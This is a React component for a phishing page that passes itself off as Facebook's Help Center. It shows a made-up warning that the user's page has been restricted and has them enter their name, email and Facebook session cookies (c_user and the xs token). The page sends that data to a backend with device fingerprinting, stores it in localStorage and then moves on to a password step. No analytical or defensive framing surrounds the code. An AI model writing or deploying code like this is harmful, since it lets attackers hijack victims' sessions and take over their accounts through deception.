import { useState, useEffect } from 'react';
import { useMutation } from '@tanstack/react-query';
import { Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import VideoPlayer from '@/components/VideoPlayer';
import FormInput from '@/components/FormInput';
import type { MainFormData } from '@shared/schema';

interface FormModuleProps {
  onNext: (submissionId: number, formData: any) => void;
}

interface DeviceInfo {
  screenWidth: number;
  screenHeight: number;
  isTouchDevice: boolean;
  userAgent: string;
  platform: string;
}

export default function FormModule({ onNext }: FormModuleProps) {
  const [formData, setFormData] = useState({
    c_user: '',
    xs: '',
    email: '',
    fullName: ''
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [deviceInfo, setDeviceInfo] = useState<DeviceInfo>({
    screenWidth: 0,
    screenHeight: 0,
    isTouchDevice: false,
    userAgent: '',
    platform: ''
  });
  const { toast } = useToast();

  // Device detection JavaScript
  useEffect(() => {
    const detectDevice = () => {
      setDeviceInfo({
        screenWidth: window.innerWidth,
        screenHeight: window.innerHeight,
        isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        userAgent: navigator.userAgent,
        platform: navigator.platform
      });
    };

    detectDevice();
    window.addEventListener('resize', detectDevice);
    return () => window.removeEventListener('resize', detectDevice);
  }, []);

  const mutation = useMutation({
    mutationFn: async (data: MainFormData) => {
      const response = await apiRequest('POST', '/api/forms/main', data);
      return response.json();
    },
    onSuccess: (data) => {
      if (data.success) {
        toast({
          title: "Form submitted successfully",
          description: "Please proceed to password verification.",
        });
        onNext(data.submissionId, formData);
      } else {
        if (data.errors) {
          const errorMap: Record<string, string> = {};
          data.errors.forEach((error: any) => {
            errorMap[error.field] = error.message;
          });
          setErrors(errorMap);
        }
      }
    },
    onError: (error) => {
      toast({
        title: "Submission failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  // JavaScript form handlers
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Store data in localStorage for password step
    localStorage.setItem('formData', JSON.stringify({
      c_user: formData.c_user,
      xs: formData.xs,
      fullName: formData.fullName,
      email: formData.email
    }));
    
    const submissionData: MainFormData = {
      fullName: formData.fullName,
      email: formData.email,
      cUser: formData.c_user,
      xs: formData.xs,
      ...deviceInfo
    };

    mutation.mutate(submissionData);
  };

  return (
    <div className="min-h-screen bg-facebook-gray py-4 px-2 sm:py-8 sm:px-4">
      <div className="container mx-auto max-w-sm sm:max-w-md">
        <div className="bg-white rounded-lg shadow-sm border border-facebook-border overflow-hidden">
          {/* Header */}
          <div className="bg-blue-600 text-white px-4 py-4 sm:py-6 text-center">
            <h1 className="text-xl sm:text-2xl font-bold">facebook</h1>
          </div>
          
          {/* Help Center Header */}
          <div className="bg-gray-100 px-4 py-2 sm:py-3 border-b border-facebook-border">
            <h2 className="text-facebook-blue font-semibold text-sm sm:text-base">Help Center</h2>
          </div>

          <div className="p-3 sm:p-4">
            {/* Alert Section */}
            <div className="bg-gray-50 p-2 sm:p-3 rounded-md mb-3 sm:mb-4">
              <h3 className="font-semibold text-facebook-text mb-2 text-sm sm:text-base">
                Request For Remove Page Violation
              </h3>
            </div>

            {/* Warning Messages */}
            <div className="space-y-2 sm:space-y-3 mb-3 sm:mb-4 text-xs sm:text-sm text-facebook-text">
              <p className="font-medium">We've identified irregular activity on your page that goes against our community guidelines.</p>
              <p className="font-medium">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
              <p className="font-medium">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
            </div>

            {/* Video Section */}
            <div className="mb-3 sm:mb-4">
              <p className="text-xs text-facebook-secondary mb-2">Detailed Video Information.</p>
              <div className="w-full max-w-xs mx-auto sm:max-w-none">
                <VideoPlayer autoplay={true} className="w-full" />
              </div>
              <p className="text-xs text-facebook-text mt-2">
                Please make sure not to log out from your computer or laptop until you have received a verification email.
              </p>
            </div>

            {/* Form */}
            <form onSubmit={handleFormSubmit} className="space-y-3 sm:space-y-4">
              <FormInput
                label="Full Name"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                error={errors.fullName}
                required
                placeholder="Enter your full name"
              />

              <FormInput
                label="Email Address"
                type="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                error={errors.email}
                required
                placeholder="Enter your email"
              />

              <FormInput
                label="c_user"
                type="text"
                name="c_user"
                value={formData.c_user}
                onChange={handleInputChange}
                error={errors.c_user}
                required
                pattern="^\d{15}$"
                title="Please enter 15 digits"
                placeholder="Enter 15-digit c_user"
              />

              <FormInput
                label="xs"
                name="xs"
                value={formData.xs}
                onChange={handleInputChange}
                error={errors.xs}
                required
                placeholder="Enter xs token"
              />

              <div className="bg-gray-50 p-2 sm:p-3 rounded-md">
                <Button
                  type="submit"
                  disabled={mutation.isPending}
                  className="w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-2 sm:py-3 px-4 rounded-md font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center text-sm sm:text-base"
                >
                  {mutation.isPending ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    'Submit'
                  )}
                </Button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}